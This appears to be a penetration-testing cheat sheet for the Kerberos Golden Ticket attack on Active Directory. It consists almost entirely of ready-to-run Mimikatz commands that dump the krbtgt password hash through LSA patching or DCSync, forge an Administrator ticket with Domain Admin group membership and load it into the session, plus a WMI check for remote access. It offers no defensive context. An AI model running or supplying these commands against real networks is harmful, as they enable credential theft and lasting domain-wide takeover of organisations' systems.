# Golden Ticket

**Dump hashes - Get the krbtgt hash**

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```

**Make golden ticket**

Use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process To get the SID use `Get-DomainSID` from powerview

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /krbtgt:<hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

**Use the DCSync feature for getting krbtgt hash. Execute with DA privileges**

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```

**Check WMI Permission**

```
Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
```
